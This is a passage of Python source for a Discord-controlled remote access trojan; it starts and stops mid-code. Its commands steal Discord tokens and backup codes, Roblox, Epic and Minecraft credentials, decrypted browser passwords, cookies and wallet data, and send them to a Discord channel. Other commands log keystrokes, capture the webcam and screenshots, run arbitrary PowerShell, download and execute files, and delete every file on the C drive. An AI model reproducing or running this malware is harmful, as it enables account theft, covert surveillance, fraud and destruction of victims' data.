        filename = file.filename
        filepath = os.path.join("uploaded_files", filename)

        async with aiohttp.ClientSession() as session:
            async with session.get(file.url) as resp:
                with open(filepath, "wb") as f:
                    f.write(await resp.read())

    else:
        url = msg.content.strip()
        filename = url.split("/")[-1]
        filepath = os.path.join("uploaded_files", filename)

        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                with open(filepath, "wb") as f:
                    f.write(await resp.read())

    SHELLEXECUTEW = ctypes.windll.shell32.ShellExecuteW
    SW_SHOWNORMAL = 1
    result = SHELLEXECUTEW(None, "open", filepath, None, None, SW_SHOWNORMAL)

    embed = discord.Embed(
        title="🟣 File Executed" if result > 32 else "❌ Failed to Execute File",
        description=f"File: `{filename}`\nResult Code: `{result}`",
        color=discord.Color.purple()
    )
    await msg.channel.send(embed=embed)
    
@bot.tree.command(name="grab", description="Grab Discord & Roblox info.")
async def grab(interaction: discord.Interaction):

    def grab_roblox_cookie():
        cookies = []
        roblox_path = os.path.expandvars(r"%LOCALAPPDATA%\Roblox")
        if not os.path.exists(roblox_path):
            return cookies
        for file in os.listdir(roblox_path):
            if file.endswith(".ROBLOSECURITY"):
                try:
                    with open(os.path.join(roblox_path, file), "r", errors="ignore") as f:
                        cookies.append(f.read().strip())
                except:
                    continue
        return cookies

    def grab_roblox_data(cookie):
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        try:
            r = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers, timeout=5)
            if r.ok:
                data = r.json()
                return {
                    "UserName": data.get("UserName", "N/A"),
                    "RobuxBalance": data.get("RobuxBalance", "N/A"),
                    "ThumbnailUrl": f"https://www.roblox.com/headshot-thumbnail/image?userId={data.get('UserID','0')}&width=150&height=150&format=png"
                }
        except:
            return None
        return None

    def grab_discord_tokens():
        LOCAL = os.getenv("LOCALAPPDATA")
        ROAMING = os.getenv("APPDATA")

        PATHS = {
            'Discord': ROAMING + '\\discord',
            'Discord Canary': ROAMING + '\\discordcanary',
            'Discord PTB': ROAMING + '\\discordptb',
            'Lightcord': ROAMING + '\\Lightcord',
            'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
            'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
            'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
            'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
            'Opera': ROAMING + '\\Opera Software\\Opera Stable',
            'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
            'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
            'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
            'Amigo': LOCAL + '\\Amigo\\User Data',
            'Torch': LOCAL + '\\Torch\\User Data',
            'Kometa': LOCAL + '\\Kometa\\User Data',
            'Orbitum': LOCAL + '\\Orbitum\\User Data',
            'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
            '7Star': LOCAL + '\\7Star\\7Star\\User Data',
            'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
            'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
            'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
            'Iridium': LOCAL + '\\Iridium\\User Data',
            'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
        }

        premium_types = {0: "❌", 1: "💎 Nitro Classic", 2: "💎 Nitro", 3: "💎 Nitro Basic"}
        tokens = []
        results = []
        pattern = re.compile(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")

        for key, path in PATHS.items():
            if not os.path.exists(path):
                continue
            if "Firefox" in key:
                for folder in os.listdir(path):
                    profile = os.path.join(path, folder)
                    leveldb = os.path.join(profile, "storage", "default", "https+++discord.com", "idb")
                    if not os.path.exists(leveldb):
                        continue
                    for file in os.listdir(leveldb):
                        try:
                            with open(os.path.join(leveldb, file), "rb") as f:
                                tokens += [t.decode() for t in pattern.findall(f.read())]
                        except:
                            continue
            else:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith((".log", ".ldb", ".sqlite")):
                            try:
                                with open(os.path.join(root, file), "rb") as f:
                                    tokens += [t.decode() for t in pattern.findall(f.read())]
                            except:
                                continue

        tokens = list(set(tokens))
        for token in tokens:
            headers = {"Authorization": token}
            try:
                user_resp = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
                if not user_resp.ok:
                    continue
                user_data = user_resp.json()
                billing_resp = requests.get(
                    "https://discord.com/api/v6/users/@me/billing/payment-sources",
                    headers=headers, timeout=5
                )
                billing_data = billing_resp.json() if billing_resp.ok else []

                gift_resp = requests.get(
                    "https://discord.com/api/v9/users/@me/outbound-promotions/codes",
                    headers=headers, timeout=5
                )
                gift_data = []
                if gift_resp.ok:
                    for gift in gift_resp.json():
                        title = gift.get("promotion", {}).get("outbound_title")
                        code = gift.get("code")
                        if title and code:
                            gift_data.append({"title": title, "code": code})

                results.append({
                    "token": token,
                    "username": user_data.get("username"),
                    "discriminator": user_data.get("discriminator"),
                    "email": user_data.get("email"),
                    "phone": user_data.get("phone"),
                    "mfa_enabled": user_data.get("mfa_enabled"),
                    "backup_codes": user_data.get("backup_codes", []),
                    "recent_2fa": user_data.get("recent_2fa", []),
                    "billing": billing_data,
                    "gift_codes": gift_data
                })
            except:
                continue
        return results

    discord_results = grab_discord_tokens()
    roblox_cookies = grab_roblox_cookie()

    for r in discord_results:
        embed = discord.Embed(title=f"🔵 {r['username']}#{r['discriminator']}", color=0x3498db)
        embed.add_field(name="🔑 Token", value=f"`{r['token']}`", inline=False)
        embed.add_field(name="✉️ Email", value=f"`{r['email']}`", inline=True)
        embed.add_field(name="📱 Phone", value=f"`{r['phone']}`", inline=True)
        embed.add_field(name="🔒 MFA", value="✅" if r["mfa_enabled"] else "❌", inline=True)
        embed.add_field(name="🛡️ Backup Codes", value="\n".join(r["backup_codes"]) or "None", inline=False)
        embed.add_field(name="📲 Recent 2FA", value="\n".join(r["recent_2fa"]) or "None", inline=False)
        embed.add_field(name="💳 Billing", value=str(r["billing"]) or "None", inline=False)
        gift_text = "\n".join([f'🎁 {g["title"]}: `{g["code"]}`' for g in r["gift_codes"]]) or "None"
        embed.add_field(name="🎁 Gift Codes", value=gift_text, inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    for i, robo_cookie in enumerate(roblox_cookies):
        roblox_data = grab_roblox_data(robo_cookie)
        if roblox_data:
            embed_roblox = discord.Embed(title=f"👾 Roblox Info {i+1}", color=0x3498db)  # Blue embed
            embed_roblox.add_field(name="👤 Username", value=f"`{roblox_data.get('UserName','N/A')}`", inline=True)
            embed_roblox.add_field(name="💰 Robux", value=f"`{roblox_data.get('RobuxBalance','N/A')}`", inline=True)
            embed_roblox.add_field(name="🍪 Cookie", value=f"`{robo_cookie}`", inline=False)
            embed_roblox.set_thumbnail(url=roblox_data.get('ThumbnailUrl', ""))
            await interaction.response.send_message(embed=embed_roblox, ephemeral=True)
            
@bot.tree.command(name="files", description="Automatically list all files on the PC.")
async def files(interaction: discord.Interaction):
    file_names = []

    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]

    for drive in drives:
        for root, dirs, files_in_dir in os.walk(drive):
            for f in files_in_dir:
                file_names.append(os.path.join(root, f))

    if not file_names:
        await interaction.response.send_message("📂 No files found on the PC.", ephemeral=True)
        return

    files_text = "\n".join(file_names)

    if len(files_text) < 4000:
        embed = discord.Embed(
            title=f"🟣 Files on PC",
            description=files_text,
            color=discord.Color.purple()
        )
        await interaction.response.send_message(embed=embed)
    else:
        file_path = os.path.join(os.getcwd(), "file_list.txt")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(files_text)

        await interaction.response.send_message(
            content=f"📄 Too many files to display. Here’s a `.txt` listing all files:",
            file=discord.File(file_path)
        )
        
@bot.tree.command(name="killprocess", description="Kill a process by name or all (with confirmation).")
@app_commands.describe(name="Process name (e.g., notepad.exe) or 'all' to kill everything")
async def killprocess(interaction: discord.Interaction, name: str):
    if name.lower() == "all":
        processes = list(psutil.process_iter(["pid", "name"]))
        desc = "\n".join([f"{proc.info['name']} (PID {proc.info['pid']})" for proc in processes[:15]])
        if len(processes) > 15:
            desc += f"\n...and {len(processes) - 15} more."
        title = "🟣 Confirm Kill ALL Processes"
    else:
        processes = [proc for proc in psutil.process_iter(["pid", "name"]) if proc.info["name"] and proc.info["name"].lower() == name.lower()]
        if not processes:
            embed = discord.Embed(
                title="🟣 Kill Process",
                description=f"No process found with name `{name}`.",
                color=discord.Color.purple()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        desc = "\n".join([f"{proc.info['name']} (PID {proc.info['pid']})" for proc in processes])
        title = f"🟣 Confirm Kill Process `{name}`"

    embed = discord.Embed(
        title=title,
        description=f"Are you sure you want to kill the following?\n\n{desc}",
        color=discord.Color.purple()
    )

    view = View()

    async def confirm_callback(inter: discord.Interaction):
        killed, failed = [], []
        for proc in processes:
            try:
                proc.kill()
                killed.append(f"{proc.info['name']} (PID {proc.info['pid']})")
            except Exception as e:
                failed.append(f"{proc.info.get('name','?')} (PID {proc.info['pid']}) - {e}")

        result_desc = ""
        if killed:
            result_desc += "✅ Killed:\n" + "\n".join(killed[:15])
            if len(killed) > 15:
                result_desc += f"\n...and {len(killed)-15} more.\n\n"
        if failed:
            result_desc += "❌ Failed:\n" + "\n".join(failed[:15])
            if len(failed) > 15:
                result_desc += f"\n...and {len(failed)-15} more."

        result_embed = discord.Embed(
            title="🟣 Kill Process Result",
            description=result_desc if result_desc else "No processes were killed.",
            color=discord.Color.purple()
        )
        await inter.response.edit_message(embed=result_embed, view=None)

    async def cancel_callback(inter: discord.Interaction):
        cancel_embed = discord.Embed(
            title="🟣 Kill Process Cancelled",
            description="No processes were killed.",
            color=discord.Color.purple()
        )
        await inter.response.edit_message(embed=cancel_embed, view=None)

    confirm_button = Button(label="Yes", style=discord.ButtonStyle.danger)
    cancel_button = Button(label="No", style=discord.ButtonStyle.secondary)
    confirm_button.callback = confirm_callback
    cancel_button.callback = cancel_callback

    view.add_item(confirm_button)
    view.add_item(cancel_button)

    await interaction.response.send_message(embed=embed, view=view)
    
@bot.tree.command(name="delete_files", description="Delete a file by name, or all files on the PC.")
@app_commands.describe(file_name="The file name to delete (or 'all' to delete every file on the PC)")
async def delete_files(interaction: discord.Interaction, file_name: str):
    deleted = []
    failed = []

    if file_name.lower() == "all":
        for root, dirs, files in os.walk("C:\\", topdown=True):
            for f in files:
                path = os.path.join(root, f)
                try:
                    os.remove(path)
                    deleted.append(path)
                except Exception as e:
                    failed.append(f"{path} - {e}")
    else:
        found = False
        for root, dirs, files in os.walk("C:\\", topdown=True):
            if file_name in files:
                found = True
                path = os.path.join(root, file_name)
                try:
                    os.remove(path)
                    deleted.append(path)
                except Exception as e:
                    failed.append(f"{path} - {e}")
        if not found:
            failed.append(f"{file_name} (not found)")

    desc = ""
    if deleted:
        desc += "✅ Deleted:\n" + "\n".join(deleted[:10])
        if len(deleted) > 10:
            desc += f"\n...and {len(deleted)-10} more.\n\n"
        else:
            desc += "\n\n"
    if failed:
        desc += "❌ Failed:\n" + "\n".join(failed[:10])
        if len(failed) > 10:
            desc += f"\n...and {len(failed)-10} more."

    embed = discord.Embed(
        title="🟣 Delete Files",
        description=desc if desc else f"No files deleted for input `{file_name}`.",
        color=discord.Color.purple()
    )

@bot.tree.command(name="keylogger", description="Logs keystrokes")
async def keylog(interaction: discord.Interaction):
    def on_press(key):
        try:
            asyncio.run_coroutine_threadsafe(
                interaction.followup.send(embed=discord.Embed(
                    title="🟣 Key Pressed",
                    description=key.char,
                    color=0x800080
                )), bot.loop
            )
        except AttributeError:
            asyncio.run_coroutine_threadsafe(
                interaction.followup.send(embed=discord.Embed(
                    title="🟣 Key Pressed",
                    description=f"[{key}]",
                    color=0x800080
                )), bot.loop
            )

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    await interaction.response.send_message(embed=discord.Embed(
        title="🟣 Keylogger Started",
        description="Logging keys..",
        color=0x800080
    ))

@bot.tree.command(name="powershell", description="Run a PowerShell command")
@app_commands.describe(cmd="The PowerShell command to execute")
async def powershell(interaction: discord.Interaction, cmd: str):
    try:
        subprocess.run(["powershell", "-Command", cmd], shell=True, timeout=10)
        await interaction.response.send_message("Success", ephemeral=True)
    except:
        await interaction.response.send_message("Failed.", ephemeral=True)

@bot.tree.command(name="webcam", description="Capture ratted retard's face")
async def webcam(interaction: discord.Interaction):
    async def capture_webcam():
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await interaction.followup.send("No cameras found.")
            try: await interaction.message.add_reaction("🔴")
            except: pass
            return

        ret, frame = cap.read()
        cap.release()
        if not ret:
            await interaction.followup.send("no cameras found.")
            try: await interaction.message.add_reaction("🔴")
            except: pass
            return

        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
            cv2.imwrite(tmpfile.name, frame)
            tmpfile_path = tmpfile.name

        embed = discord.Embed(title="Webcam Capture", color=discord.Color.blue())
        file = discord.File(tmpfile_path, filename="webcam.png")
        embed.set_image(url="attachment://webcam.png")
        await interaction.followup.send(embed=embed, file=file)
        os.remove(tmpfile_path)

    await interaction.response.defer()
    await capture_webcam()

@bot.tree.command(name="monitor-screenshots", description="screenshot every second")
async def monitor_screenshots(interaction: discord.Interaction):
    async def send_screenshots():
        await interaction.response.defer()
        while True:
            monitors = ImageGrab.grab(all_screens=True)
            if not isinstance(monitors, list):
                monitors = [monitors]

            files = []
            embeds = []
            for idx, screen in enumerate(monitors):
                with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
                    screen.save(tmpfile.name, "PNG")
                    files.append(discord.File(tmpfile.name, filename=f"screen{idx}.png"))
                    embed = discord.Embed(title=f"🖥 screenshot {idx+1}", color=discord.Color.blue())
                    embed.set_image(url=f"attachment://screen{idx}.png")
                    embeds.append(embed)

            for embed, file in zip(embeds, files):
                await interaction.followup.send(embed=embed, file=file)
                os.remove(file.filename)

            await asyncio.sleep(1)

    await send_screenshots()

@bot.tree.command(name="jumpscare", description="Triggers a jumpscare on the Ratted PC")
async def jumpscare(interaction: discord.Interaction):
    async def run_jumpscare():
        await interaction.response.defer()

        def show_jumpscare():
            try:
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.configure(bg='black')

                img_url = "https://files.catbox.moe/x7ns0k.jpeg"
                resp = requests.get(img_url)
                image = Image.open(BytesIO(resp.content))
                image = image.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.ANTIALIAS)
                photo = ImageTk.PhotoImage(image)

                label = tk.Label(root, image=photo)
                label.pack()

                sound_url = "https://files.catbox.moe/2nd39d.mp4"
                resp = requests.get(sound_url)
                with tempfile.NamedTemporaryFile(delete=False, suffix=".mp4") as tmpfile:
                    tmpfile.write(resp.content)
                    sound_path = tmpfile.name

                threading.Thread(target=lambda: playsound(sound_path), daemon=True).start()
                root.after(3000, lambda: (root.destroy(), os.remove(sound_path) if os.path.exists(sound_path) else None))
                root.mainloop()

                async def send_success():
                    msg = await interaction.followup.send(embed=discord.Embed(title="🟢 Triggered Jumpscare Successfully.", color=discord.Color.green()))
                    try: await msg.add_reaction("🟢")
                    except: pass

                asyncio.run_coroutine_threadsafe(send_success(), bot.loop)

            except:
                async def send_fail():
                    msg = await interaction.followup.send(embed=discord.Embed(title="🔴 Failed to Trigger Jumpscare.", color=discord.Color.red()))
                    try: await msg.add_reaction("🔴")
                    except: pass

                asyncio.run_coroutine_threadsafe(send_fail(), bot.loop)

        threading.Thread(target=show_jumpscare).start()

    await run_jumpscare()

@bot.tree.command(name="get-game-accounts", description="Grab Epic, Fortnite, and Minecraft login info with extras")
async def get_game_accounts(interaction: discord.Interaction):
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    EPIC_PATH = os.path.join(LOCAL, "EpicGamesLauncher", "Saved", "Config", "Windows")
    FORTNITE_PATH = os.path.join(LOCAL, "FortniteGame", "Saved", "Config", "Windows")
    MINECRAFT_PATH = os.path.join(ROAMING, ".minecraft")

    def decrypt_password(enc_bytes):
        try:
            return win32crypt.CryptUnprotectData(enc_bytes, None, None, None, 0)[1].decode()
        except:
            return "N/A"

    def grab_epic_accounts():
        accounts = []
        if not os.path.exists(EPIC_PATH):
            return accounts
        for file in os.listdir(EPIC_PATH):
            if file.endswith(".json"):
                try:
                    with open(os.path.join(EPIC_PATH, file), "r", encoding="utf-8") as f:
                        data = json.load(f)
                        for acc in data.get("Accounts", []):
                            accounts.append({
                                "username": acc.get("DisplayName", "N/A"),
                                "email": acc.get("Email", "N/A"),
                                "password": decrypt_password(acc.get("Password", "").encode()) if acc.get("Password") else "N/A",
                                "2fa_enabled": acc.get("bEnableTwoFactorAuthentication", False),
                                "last_login": acc.get("LastLoginTime", "N/A"),
                                "session_id": acc.get("SessionId", "N/A"),
                                "gift_codes": acc.get("GiftCodes", [])
                            })
                except:
                    continue
        return accounts

    def grab_fortnite_accounts():
        accounts = []
        if not os.path.exists(FORTNITE_PATH):
            return accounts
        for file in os.listdir(FORTNITE_PATH):
            if file.endswith(".json"):
                try:
                    with open(os.path.join(FORTNITE_PATH, file), "r", encoding="utf-8") as f:
                        data = json.load(f)
                        accounts.append({
                            "file_name": file,
                            "profile_name": data.get("ProfileName", "N/A"),
                            "email": data.get("Email", "N/A"),
                            "password": data.get("Password", "N/A"),
                            "session_id": data.get("SessionId", "N/A"),
                            "level": data.get("PlayerLevel", "N/A"),
                            "vbucks": data.get("AccountInfo", {}).get("Vbucks", "N/A"),
                            "skins": data.get("AccountInfo", {}).get("Skins", []),
                            "battle_pass": data.get("AccountInfo", {}).get("BattlePassTier", "N/A"),
                            "gift_codes": data.get("GiftCodes", []),
                            "raw_preview": json.dumps(data)[:1000] + "..."
                        })
                except:
                    continue
        return accounts

    def grab_minecraft_accounts():
        accounts = []
        auth_path = os.path.join(MINECRAFT_PATH, "launcher_accounts.json")
        if os.path.exists(auth_path):
            try:
                with open(auth_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    for user_id, info in data.items():
                        accounts.append({
                            "username": info.get("displayName", "N/A"),
                            "email": info.get("email", "N/A"),
                            "token": info.get("accessToken", "N/A"),
                            "session_id": info.get("clientToken", "N/A"),
                            "gift_codes": info.get("GiftCodes", [])
                        })
            except:
                pass
        return accounts

    epic_accounts = grab_epic_accounts()
    fortnite_accounts = grab_fortnite_accounts()
    minecraft_accounts = grab_minecraft_accounts()

    for acc in epic_accounts:
        embed = discord.Embed(
            title=f"🎮 Epic Games Account: {acc['username']}",
            color=0x3498db
        )
        embed.add_field(name="✉️ Email", value=f"`{acc['email']}`", inline=True)
        embed.add_field(name="🔑 Password", value=f"`{acc['password']}`", inline=True)
        embed.add_field(name="🔒 2FA Enabled", value="✅" if acc["2fa_enabled"] else "❌", inline=True)
        embed.add_field(name="⏱ Last Login", value=f"`{acc['last_login']}`", inline=True)
        embed.add_field(name="💻 Session ID", value=f"`{acc['session_id']}`", inline=False)
        gift_text = "\n".join([f"`{g}`" for g in acc.get("gift_codes", [])]) or "None"
        embed.add_field(name="🎁 Gift Codes", value=gift_text, inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    for acc in fortnite_accounts:
        embed = discord.Embed(
            title=f"🎯 Fortnite Profile: {acc['profile_name']}",
            color=0x3498db
        )
        embed.add_field(name="📄 File", value=f"`{acc['file_name']}`", inline=True)
        embed.add_field(name="✉️ Email", value=f"`{acc['email']}`", inline=True)
        embed.add_field(name="🔑 Password", value=f"`{acc['password']}`", inline=True)
        embed.add_field(name="💻 Session ID", value=f"`{acc['session_id']}`", inline=True)
        embed.add_field(name="🏆 Level", value=f"`{acc['level']}`", inline=True)
        embed.add_field(name="💰 V-Bucks", value=f"`{acc['vbucks']}`", inline=True)
        embed.add_field(name="🎨 Skins", value=", ".join(acc.get("skins", [])) or "None", inline=False)
        embed.add_field(name="🎫 Battle Pass Tier", value=f"`{acc.get('battle_pass','N/A')}`", inline=True)
        gift_text = "\n".join([f"`{g}`" for g in acc.get("gift_codes", [])]) or "None"
        embed.add_field(name="🎁 Gift Codes", value=gift_text, inline=False)
        embed.add_field(name="Preview (truncated)", value=f"```{acc['raw_preview']}```", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    for acc in minecraft_accounts:
        embed = discord.Embed(
            title=f"⛏️ Minecraft Account: {acc['username']}",
            color=0x3498db
        )
        embed.add_field(name="✉️ Email", value=f"`{acc['email']}`", inline=True)
        embed.add_field(name="🔑 Token", value=f"`{acc['token']}`", inline=True)
        embed.add_field(name="💻 Session ID", value=f"`{acc['session_id']}`", inline=True)
        gift_text = "\n".join([f"`{g}`" for g in acc.get("gift_codes", [])]) or "None"
        embed.add_field(name="🎁 Gift Codes", value=gift_text, inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="grab_others", description="Grab advanced account info from apps and wallets")
async def get_accounts(interaction: discord.Interaction):
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    PATHS = {
        "Facebook": ROAMING + "\\Facebook",
        "Messenger": ROAMING + "\\Messenger",
        "WhatsApp": ROAMING + "\\WhatsApp",
        "Netflix": ROAMING + "\\Netflix",
        "Wallet": LOCAL + "\\WalletApp",
        "GCash": LOCAL + "\\GCashApp",
        "BankApp1": LOCAL + "\\BankApp1",
        "BankApp2": LOCAL + "\\BankApp2"
    }

    def decrypt_password(encrypted: bytes) -> str:
        try:
            return CryptUnprotectData(encrypted, None, None, None, 0)[1].decode()
        except:
            return "Could not decrypt"

    def get_chrome_logins(path: str):
        accounts = []
        login_db = os.path.join(path, "Default", "Login Data")
        if os.path.exists(login_db):
            try:
                conn = sqlite3.connect(login_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")
                for url, user, pwd, created, last_used in cursor.fetchall():
                    pwd_dec = decrypt_password(pwd)
                    accounts.append({
                        "url": url,
                        "username": user,
                        "password": pwd_dec,
                        "created": created or "N/A",
                        "last_used": last_used or "N/A",
                        "device": "N/A",
                        "2FA": "N/A"
                    })
                conn.close()
            except:
                pass
        return accounts

    def get_json_logins(path: str):
        accounts = []
        if os.path.exists(path):
            for file in os.listdir(path):
                full_path = os.path.join(path, file)
                if file.endswith((".json", ".ldb", ".txt")):
                    try:
                        with open(full_path, "r", errors="ignore") as f:
                            data = json.load(f)
                            accounts.append(data)
                    except:
                        continue
        return accounts

    def get_wallet_balance(account_data):
        try:
            return account_data.get("balance", "N/A")
        except:
            return "N/A"

    for platform, path in PATHS.items():
        is_chrome = platform in ["Facebook", "Messenger", "WhatsApp", "Netflix"]
        accounts = get_chrome_logins(path) if is_chrome else get_json_logins(path)

        if not accounts:
            embed_empty = discord.Embed(
                title=f"🔴 {platform} Accounts",
                description="No accounts found.",
                color=discord.Color.blue()
            )
            await interaction.response.send_message(embed=embed_empty, ephemeral=True)
            continue

        for i, acc in enumerate(accounts, start=1):
            embed = discord.Embed(
                title=f"💎 {platform} Account {i}",
                color=discord.Color.blue()
            )

            if is_chrome:
                embed.add_field(name="🌐 URL", value=acc.get("url", "N/A"), inline=False)
                embed.add_field(name="✉ Username/Email", value=acc.get("username", "N/A"), inline=True)
                embed.add_field(name="🔑 Password", value=acc.get("password", "N/A"), inline=True)
                embed.add_field(name="💻 Device Info", value=acc.get("device", "N/A"), inline=True)
                embed.add_field(name="🕒 Date Created", value=acc.get("created", "N/A"), inline=True)
                embed.add_field(name="🕒 Last Used", value=acc.get("last_used", "N/A"), inline=True)
                embed.add_field(name="🔒 2FA Enabled", value=acc.get("2FA", "N/A"), inline=True)
            else:
                for k, v in acc.items():
                    embed.add_field(name=f"🛠 {k}", value=str(v), inline=True)
                if platform in ["Wallet", "GCash"]:
                    balance = get_wallet_balance(acc)
                    embed.add_field(name="💰 Balance", value=balance, inline=True)

            await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="grab_cookies", description="Grab all browser and app cookies including sessions")
async def grab_cookies(interaction: discord.Interaction):
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    TEMP_DIR = tempfile.gettempdir()
    ZIP_PATH = os.path.join(TEMP_DIR, "grabbed_cookies.zip")

    PATHS = {
        'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
        'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
        'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\User Data',
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Iridium': LOCAL + '\\Iridium\\User Data',
        'Facebook': ROAMING + '\\Facebook',
        'Messenger': ROAMING + '\\Messenger',
        'WhatsApp': ROAMING + '\\WhatsApp',
        'Netflix': ROAMING + '\\Netflix',
        'Replit': ROAMING + '\\Replit',
        'Roblox': LOCAL + '\\Roblox',
        'Epic Games': LOCAL + '\\Epic Games',
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Discord PTB': ROAMING + '\\discordptb',
        'Lightcord': ROAMING + '\\Lightcord'
    }

    def decrypt(data: bytes) -> str:
        try:
            return CryptUnprotectData(data, None, None, None, 0)[1].decode()
        except:
            return data.decode(errors="ignore") if isinstance(data, bytes) else str(data)

    def get_chrome_cookies(path):
        cookies = []
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith("Cookies"):
                    try:
                        conn = sqlite3.connect(os.path.join(root, file))
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                        for host, name, val in cursor.fetchall():
                            cookies.append(f"{host}\t{name}\t{decrypt(val)}")
                        conn.close()
                    except:
                        continue
        return cookies

    def get_json_cookies(path):
        cookies = []
        if os.path.exists(path):
            for file in os.listdir(path):
                full_path = os.path.join(path, file)
                if file.endswith((".json", ".ldb", ".txt")):
                    try:
                        with open(full_path, "r", errors="ignore") as f:
                            data = json.load(f)
                            for k, v in data.items():
                                cookies.append(f"{k}: {v}")
                    except:
                        continue
        return cookies

    def grab_special_sessions():
        sessions = []

        roblox_path = os.path.join(LOCAL, "Roblox")
        if os.path.exists(roblox_path):
            for file in os.listdir(roblox_path):
                if file.endswith(".ROBLOSECURITY"):
                    try:
                        with open(os.path.join(roblox_path, file), "r", errors="ignore") as f:
                            sessions.append(f"Roblox: {f.read().strip()}")
                    except:
                        continue

        epic_path = os.path.join(LOCAL, "Epic Games", "Launcher", "Saved", "Config", "Windows")
        if os.path.exists(epic_path):
            for file in os.listdir(epic_path):
                if file.endswith(".json"):
                    try:
                        with open(os.path.join(epic_path, file), "r", errors="ignore") as f:
                            data = json.load(f)
                            token = data.get("AccessToken") or data.get("RefreshToken")
                            if token:
                                sessions.append(f"Epic Games: {token}")
                    except:
                        continue

        discord_paths = [
            ROAMING + '\\discord',
            ROAMING + '\\discordcanary',
            ROAMING + '\\discordptb',
            ROAMING + '\\Lightcord'
        ]
        pattern = re.compile(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
        for path in discord_paths:
            if os.path.exists(path):
                for root, dirs, files in os.walk(path):
                    for file in files:
                        if file.endswith((".log", ".ldb", ".sqlite")):
                            try:
                                with open(os.path.join(root, file), "rb") as f:
                                    tokens = [t.decode() for t in pattern.findall(f.read())]
                                    for t in tokens:
                                        sessions.append(f"Discord Token: {t}")
                            except:
                                continue
        return sessions

    all_cookies = []

    for app, path in PATHS.items():
        is_chrome_based = app in ['Chrome','Edge','Brave','Opera','Opera GX','Vivaldi','Yandex','Torch','Kometa','CentBrowser','7Star','Sputnik','Epic Privacy Browser','Iridium']
        is_json_app = app in ['Facebook','Messenger','WhatsApp','Netflix','Replit','Roblox','Epic Games','Discord','Discord Canary','Discord PTB','Lightcord']
        cookies = get_chrome_cookies(path) if is_chrome_based else get_json_cookies(path)
        if cookies:
            all_cookies.append(f"--- {app} Cookies ---\n" + "\n".join(cookies))
        else:
            all_cookies.append(f"--- {app} Cookies ---\nNo cookies found.")

    sessions = grab_special_sessions()
    if sessions:
        all_cookies.append("--- Special Sessions ---\n" + "\n".join(sessions))

    with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for i, block in enumerate(all_cookies, start=1):
            txt_name = f"cookies_block_{i}.txt"
            tmp_file = os.path.join(TEMP_DIR, txt_name)
            with open(tmp_file, "w", encoding="utf-8") as f:
                f.write(block)
            zipf.write(tmp_file, arcname=txt_name)
            os.remove(tmp_file)

    embed = discord.Embed(title="🟦 Browser & App Cookies + Sessions", description="All cookies & sessions collected", color=discord.Color.blue())
    embed.set_footer(text="grabbed_cookies.zip")

    with open(ZIP_PATH, "rb") as f:
        await interaction.response.send_message(embed=embed, file=discord.File(f, "grabbed_cookies.zip"), ephemeral=True)

    os.remove(ZIP_PATH)

@bot.tree.command(name="browser-history", description="Grab browser history from multiple browsers")
async def browser_history(interaction: discord.Interaction):
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")

    BROWSERS = {
